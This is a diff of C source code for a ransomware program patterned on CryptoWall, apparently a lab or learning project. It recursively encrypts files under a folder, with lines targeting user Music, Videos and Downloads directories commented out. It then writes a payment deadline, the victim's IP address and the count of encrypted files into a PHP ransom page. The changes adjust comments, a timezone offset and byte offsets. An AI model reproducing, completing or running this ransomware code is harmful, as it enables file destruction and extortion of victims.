@@ -64,7 +64,7 @@ void SearchFiles(const char* sDir, const uint8_t* key) {
     hFind = FindFirstFile(sPath, &fdFile);
     do {
         if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
-            //Build up file path
+            // Build up file path
             sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
             // Is the entity a File or Folder?
             if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
@@ -93,7 +93,7 @@ int main() {
   fclose(kfile);
 
   /// ENCRYPT FILES
-  // Encrypt Files in this folders and subfolders:
+  // Encrypt Files in those folders and subfolders:
   SearchFiles("testfolder", key);
   //SearchFiles("C:\\Users\\User\\Music", key);
   //SearchFiles("C:\\Users\\User\\Videos", key);
@@ -102,15 +102,15 @@ int main() {
   //SearchFiles("C:\\Users\\User\\Downloads", key);
 
   /// GET TIME OF TOMORROW
-  const int timediff = -8; // php time is 8 less that localtime
-  time_t time = seed + (24 + timediff) * 60 *60;
+  const int timediff = -3; // current timezone
+  time_t time = seed + (24 - timediff) * 60 *60;
   tm* timeinfo = localtime(&time);
   unsigned int year = timeinfo->tm_year + 1900;
   unsigned int month = timeinfo->tm_mon + 1;
 
   /// ADD DATE TO FILE
   FILE* cryptowall = fopen("C:\\xampp\\htdocs\\cryptowall\\index.php", "r+");
-  fseek(cryptowall, 96, SEEK_SET);
+  fseek(cryptowall, 95, SEEK_SET);
   fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
           timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 
@@ -122,7 +122,7 @@ int main() {
   fclose(loadip);
 
   /// ADD IP
-  fseek(cryptowall, 1164, SEEK_SET);
+  fseek(cryptowall, 1163, SEEK_SET);
   // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
   char buffer[16] = "               ";
   int pad = sprintf(buffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
@@ -130,7 +130,7 @@ int main() {
   fwrite(buffer, sizeof(char), 15, cryptowall);
 
   /// ADD Total Files Encrypted
-  fseek(cryptowall, 1332, SEEK_SET);
+  fseek(cryptowall, 1331, SEEK_SET);
   fprintf(cryptowall, "%1u,%03u", cant_files / 1000, cant_files % 1000);
   fclose(cryptowall);
 
